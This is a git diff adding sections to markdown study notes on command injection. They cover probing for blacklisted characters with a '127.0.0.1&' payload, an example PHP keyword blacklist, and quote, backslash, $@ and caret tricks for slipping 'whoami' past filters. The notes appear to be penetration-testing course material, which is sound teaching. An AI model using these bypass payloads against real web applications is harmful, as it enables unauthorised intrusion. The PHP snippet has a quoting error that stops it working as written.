@@ -135,6 +135,13 @@ Referencing the above code, if our string contains any of the characters in `$bl
 ## Bypassing Other Blacklisted Characters
 We can use environment variables to pick a special character contained in that variable to insert in to our command injections.
 
+### Enumeration
+Blacklisted characters can be enumerated by just adding a character to the legit payload and seeing if it is blocked
+```html
+payload=127.0.0.1&
+```
+*Example with just the `&` added to our ping payload.*
+
 ### Linux
 We can use environment variables to bypass Filters much like we did with `${IFS}`
 
@@ -176,6 +183,44 @@ echo $(tr '!-}' '"-~'<<<[)
 ```
 
 ## Bypassing Blacklisted Commands
+### Enumeration
+If we've found a character that we know is not blocked using the above methods, it's possible that the command itself is blocked.
+```PHP
+$blacklist = ['whoami', 'cat', ...SNIP...];
+foreach ($blacklist as $word) {
+    if (strpos('$_POST['ip']', $word) !== false) {
+        echo "Invalid input";
+    }
+}
+```
+*Example PHP command blacklist (stored in the `$blacklist` variable)*
+
+### Linux & Windows
+One very common and easy obfuscation technique is to insert characters into the command that are normally ignored by Bash or Powershell, such as single quote `'` or a double-quote `"`.
+```bash
+w'h'o'am'i
+```
+*Example Obfuscation using a single quote of the `whoami` command*
+> Note: We cannot mix and max obfuscators. If you use single quotes, you can only use single quotes. The quotes must also be an even number.
+
+### Linux
+We can use a few other linux only characters for obfuscation of our command, including the `\` and the positional `$@`. These works exactly as they did with the quotes, without the even requirement.
+```bash
+who$@ami
+```
+*Example obfuscation of `whoami` using the `$@` operator.*
+```bash
+w\ho\am\i
+```
+*Example obfuscation of `whoami` using the `\`*
+
+### Windows
+Some windows-only characters we can insert into a command without affecting the outcome are the caret (`^`)
+```cmd
+who^ami
+```
+*Example obfuscation of `whoami` using a caret
+
 ## Advanced Command Obfuscation
 ## Evasion Tools
 
